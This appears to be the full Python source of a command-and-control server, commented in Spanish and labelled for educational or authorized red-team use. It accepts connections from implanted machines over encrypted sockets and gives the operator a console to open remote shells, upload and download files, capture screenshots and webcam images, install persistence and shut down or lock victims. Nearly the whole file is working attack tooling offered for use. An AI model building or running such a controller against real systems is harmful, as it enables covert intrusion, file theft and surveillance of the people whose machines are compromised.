#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# RedTeam C2 Framework v1.0 - SOLO USO EDUCATIVO/AUTORIZADO

import socket
import threading
import sys
import os
import time
import datetime
import hashlib
import json
import base64
import readline
import struct
from colorama import init, Fore, Back, Style
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

init(autoreset=True)

# ============================================================================
# CONFIGURACIÓN
# ============================================================================
HOST = '0.0.0.0'
PORT = 4444
BUFFER_SIZE = 8192
HEARTBEAT_INTERVAL = 5
PASSWORD = "RedTeamC2_2024_Key!"
LOG_FILE = "c2_log.txt"

# ============================================================================
# UTILIDADES
# ============================================================================
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def log(message, type="info"):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] [{type.upper()}] {message}\n")
    
    if type == "success":
        print(f"{Colors.GREEN}[+] {message}{Colors.END}")
    elif type == "error":
        print(f"{Colors.FAIL}[-] {message}{Colors.END}")
    elif type == "warning":
        print(f"{Colors.WARNING}[!] {message}{Colors.END}")
    elif type == "info":
        print(f"{Colors.BLUE}[*] {message}{Colors.END}")

def encrypt_data(data, key):
    cipher = Fernet(key)
    return cipher.encrypt(data.encode())

def decrypt_data(data, key):
    cipher = Fernet(key)
    return cipher.decrypt(data).decode()

def generate_key(password):
    salt = b'redteam_salt_2024'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key

# ============================================================================
# CLIENTE (BOT)
# ============================================================================
class Client:
    def __init__(self, conn, addr, crypto_key):
        self.conn = conn
        self.addr = addr
        self.crypto_key = crypto_key
        self.id = hashlib.md5(f"{addr[0]}:{addr[1]}:{time.time()}".encode()).hexdigest()[:8]
        self.hostname = "Unknown"
        self.username = "Unknown"
        self.os = "Unknown"
        self.antivirus = "Unknown"
        self.first_seen = datetime.datetime.now()
        self.last_seen = datetime.datetime.now()
        self.active = True
        
    def send(self, data):
        try:
            encrypted = encrypt_data(data, self.crypto_key)
            self.conn.send(struct.pack('>I', len(encrypted)) + encrypted)
            return True
        except:
            self.active = False
            return False
    
    def recv(self):
        try:
            raw_msglen = self.recvall(4)
            if not raw_msglen:
                return None
            msglen = struct.unpack('>I', raw_msglen)[0]
            encrypted = self.recvall(msglen)
            if not encrypted:
                return None
            return decrypt_data(encrypted, self.crypto_key)
        except:
            self.active = False
            return None
    
    def recvall(self, n):
        data = bytearray()
        while len(data) < n:
            packet = self.conn.recv(n - len(data))
            if not packet:
                return None
            data.extend(packet)
        return bytes(data)
    
    def update_info(self, info):
        self.hostname = info.get('hostname', 'Unknown')
        self.username = info.get('username', 'Unknown')
        self.os = info.get('os', 'Unknown')
        self.antivirus = info.get('antivirus', 'Unknown')
        self.last_seen = datetime.datetime.now()
    
    def __str__(self):
        status = f"{Colors.GREEN}Active{Colors.END}" if self.active else f"{Colors.FAIL}Dead{Colors.END}"
        return f"[{self.id}] {self.addr[0]}:{self.addr[1]} | {self.hostname} | {self.username} | {status}"

# ============================================================================
# SERVIDOR C2
# ============================================================================
class C2Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.clients = {}
        self.current_client = None
        self.crypto_key = generate_key(PASSWORD)
        self.running = True
        self.socket = None
        
    def start(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            log(f"C2 Server iniciado en {self.host}:{self.port}", "success")
        except Exception as e:
            log(f"Error al iniciar servidor: {e}", "error")
            sys.exit(1)
        
        # Thread para aceptar conexiones
        accept_thread = threading.Thread(target=self.accept_connections)
        accept_thread.daemon = True
        accept_thread.start()
        
        # Thread para limpiar clientes muertos
        cleanup_thread = threading.Thread(target=self.cleanup_clients)
        cleanup_thread.daemon = True
        cleanup_thread.start()
        
        self.interactive_shell()
    
    def accept_connections(self):
        while self.running:
            try:
                conn, addr = self.socket.accept()
                log(f"Nueva conexión de {addr[0]}:{addr[1]}", "success")
                
                client = Client(conn, addr, self.crypto_key)
                self.clients[client.id] = client
                
                # Recibir información inicial
                client.send("INFO")
                info_data = client.recv()
                if info_data:
                    try:
                        info = json.loads(info_data)
                        client.update_info(info)
                    except:
                        pass
                
            except Exception as e:
                if self.running:
                    log(f"Error aceptando conexión: {e}", "error")
    
    def cleanup_clients(self):
        while self.running:
            time.sleep(30)
            dead_clients = []
            for client_id, client in self.clients.items():
                if not client.active:
                    dead_clients.append(client_id)
            
            for client_id in dead_clients:
                log(f"Eliminando cliente muerto: {client_id}", "warning")
                del self.clients[client_id]
    
    def list_clients(self):
        if not self.clients:
            log("No hay clientes conectados", "warning")
            return
        
        print(f"\n{Colors.BOLD}{Colors.HEADER}=== CLIENTES CONECTADOS ==={Colors.END}")
        print(f"{'ID':<10} {'IP':<16} {'HOSTNAME':<20} {'USER':<15} {'STATUS':<10}")
        print("-" * 80)
        
        for client_id, client in self.clients.items():
            status = "Active" if client.active else "Dead"
            status_color = Colors.GREEN if client.active else Colors.FAIL
            print(f"{client_id:<10} {client.addr[0]:<16} {client.hostname:<20} "
                  f"{client.username:<15} {status_color}{status:<10}{Colors.END}")
        print()
    
    def select_client(self, client_id):
        if client_id in self.clients:
            self.current_client = self.clients[client_id]
            log(f"Cliente seleccionado: {client_id} ({self.current_client.addr[0]})", "success")
            return True
        else:
            log(f"Cliente {client_id} no encontrado", "error")
            return False
    
    def send_command(self, command):
        if not self.current_client:
            log("No hay cliente seleccionado", "error")
            return
        
        if not self.current_client.active:
            log("El cliente no está activo", "error")
            return
        
        self.current_client.send(command)
        response = self.current_client.recv()
        
        if response:
            print(f"\n{Colors.CYAN}[Respuesta desde {self.current_client.addr[0]}]:{Colors.END}")
            print(response)
            print()
        else:
            log("No se recibió respuesta del cliente", "error")
    
    def handle_download(self, filename):
        if not self.current_client:
            log("No hay cliente seleccionado", "error")
            return
        
        self.current_client.send(f"DOWNLOAD {filename}")
        response = self.current_client.recv()
        
        if response and response.startswith("FILE:"):
            _, size, data = response.split(":", 2)
            size = int(size)
            file_data = base64.b64decode(data)
            
            save_path = f"downloaded_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}_{filename}"
            with open(save_path, "wb") as f:
                f.write(file_data)
            
            log(f"Archivo descargado como: {save_path}", "success")
        else:
            log(f"Error descargando archivo: {response}", "error")
    
    def handle_upload(self, local_file, remote_path):
        if not self.current_client:
            log("No hay cliente seleccionado", "error")
            return
        
        try:
            with open(local_file, "rb") as f:
                file_data = f.read()
            
            encoded = base64.b64encode(file_data).decode()
            self.current_client.send(f"UPLOAD {remote_path} {len(file_data)} {encoded}")
            response = self.current_client.recv()
            log(f"Upload result: {response}", "success" if "OK" in response else "error")
        except Exception as e:
            log(f"Error subiendo archivo: {e}", "error")
    
    def interactive_shell(self):
        print(f"""{Colors.HEADER}
╔══════════════════════════════════════════════════════════════╗
║                    RedTeam C2 Framework v1.0                 ║
║                  SOLO USO EDUCATIVO/AUTORIZADO               ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}""")
        
        while True:
            try:
                if self.current_client:
                    prompt = f"{Colors.GREEN}C2 [{self.current_client.addr[0]}] > {Colors.END}"
                else:
                    prompt = f"{Colors.BLUE}C2 > {Colors.END}"
                
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                # Comandos del framework
                if command.lower() == "exit":
                    log("Saliendo...", "info")
                    self.running = False
                    break
                
                elif command.lower() == "help":
                    self.show_help()
                
                elif command.lower() == "list":
                    self.list_clients()
                
                elif command.lower().startswith("use "):
                    client_id = command.split()[1]
                    self.select_client(client_id)
                
                elif command.lower() == "back":
                    self.current_client = None
                    log("Cliente deseleccionado", "info")
                
                # Comandos para cliente seleccionado
                elif self.current_client:
                    if command.lower().startswith("ejecutar "):
                        program = command[9:]
                        self.send_command(f"EXEC {program}")
                    
                    elif command.lower() == "shell":
                        self.send_command("SHELL_START")
                        self.interactive_remote_shell()
                    
                    elif command.lower().startswith("subir "):
                        parts = command.split()
                        if len(parts) >= 2:
                            local = parts[1]
                            remote = parts[2] if len(parts) > 2 else os.path.basename(local)
                            self.handle_upload(local, remote)
                    
                    elif command.lower().startswith("descargar "):
                        filename = command[10:]
                        self.handle_download(filename)
                    
                    elif command.lower() == "pantallazo":
                        self.send_command("SCREENSHOT")
                    
                    elif command.lower() == "webcam":
                        self.send_command("WEBCAM")
                    
                    elif command.lower() == "info":
                        self.send_command("INFO_FULL")
                    
                    elif command.lower() == "procesos":
                        self.send_command("PROCESSES")
                    
                    elif command.lower().startswith("matar "):
                        pid = command[6:]
                        self.send_command(f"KILL {pid}")
                    
                    elif command.lower() == "instalar":
                        self.send_command("INSTALL")
                    
                    elif command.lower() == "desinstalar":
                        self.send_command("UNINSTALL")
                    
                    elif command.lower() == "selfdestruct":
                        confirm = input(f"{Colors.WARNING}¿Estás seguro? (yes/no): {Colors.END}")
                        if confirm.lower() == "yes":
                            self.send_command("SELFDESTRUCT")
                            self.current_client = None
                    
                    elif command.lower() in ["apagar", "reiniciar", "cerrar", "bloquear"]:
                        self.send_command(command.upper())
                    
                    else:
                        log(f"Comando desconocido: {command}", "error")
                
                else:
                    log("Selecciona un cliente primero (use <ID>)", "warning")
                    
            except KeyboardInterrupt:
                print()
                log("Ctrl+C presionado", "warning")
                continue
            except Exception as e:
                log(f"Error: {e}", "error")
    
    def interactive_remote_shell(self):
        print(f"{Colors.CYAN}[+] Modo shell remoto interactivo. Escribe 'exit' para volver.{Colors.END}")
        
        while True:
            try:
                cmd = input(f"{Colors.YELLOW}RemoteShell> {Colors.END}")
                
                if cmd.lower() == "exit":
                    self.send_command("SHELL_END")
                    break
                
                self.send_command(f"SHELL {cmd}")
                
            except KeyboardInterrupt:
                print()
                break
    
    def show_help(self):
        print(f"""{Colors.BOLD}{Colors.HEADER}
=== COMANDOS DEL FRAMEWORK ==={Colors.END}
  {Colors.GREEN}list{Colors.END}                    - Lista todos los clientes
  {Colors.GREEN}use <ID>{Colors.END}               - Selecciona un cliente por ID
  {Colors.GREEN}back{Colors.END}                   - Deselecciona el cliente actual
  {Colors.GREEN}exit{Colors.END}                   - Sale del framework
  {Colors.GREEN}help{Colors.END}                   - Muestra esta ayuda

{Colors.BOLD}{Colors.HEADER}=== COMANDOS PARA CLIENTE SELECCIONADO ==={Colors.END}
  {Colors.GREEN}ejecutar <programa>{Colors.END}    - Ejecuta un programa (calc, notepad, etc)
  {Colors.GREEN}shell{Colors.END}                  - Shell remota interactiva
  {Colors.GREEN}subir <local> [remoto]{Colors.END} - Sube archivo al cliente
  {Colors.GREEN}descargar <archivo>{Colors.END}    - Descarga archivo del cliente
  {Colors.GREEN}pantallazo{Colors.END}             - Toma captura de pantalla
  {Colors.GREEN}webcam{Colors.END}                 - Captura de cámara web
  {Colors.GREEN}info{Colors.END}                   - Muestra información del sistema
  {Colors.GREEN}procesos{Colors.END}               - Lista procesos activos
  {Colors.GREEN}matar <PID>{Colors.END}            - Mata un proceso por PID
  {Colors.GREEN}instalar{Colors.END}               - Instala persistencia
  {Colors.GREEN}desinstalar{Colors.END}            - Elimina persistencia
  {Colors.GREEN}selfdestruct{Colors.END}           - Autoelimina el implant
  {Colors.GREEN}apagar{Colors.END}                 - Apaga el sistema
  {Colors.GREEN}reiniciar{Colors.END}              - Reinicia el sistema
  {Colors.GREEN}cerrar{Colors.END}                 - Cierra sesión
  {Colors.GREEN}bloquear{Colors.END}               - Bloquea la pantalla
        """)

# ============================================================================
# MAIN
# ============================================================================
if __name__ == "__main__":
    if len(sys.argv) > 1:
        PORT = int(sys.argv[1])
    
    server = C2Server(HOST, PORT)
    
    try:
        server.start()
    except KeyboardInterrupt:
        log("Servidor detenido por el usuario", "warning")
    except Exception as e:
        log(f"Error fatal: {e}", "error")
    finally:
        if server.socket:
            server.socket.close()
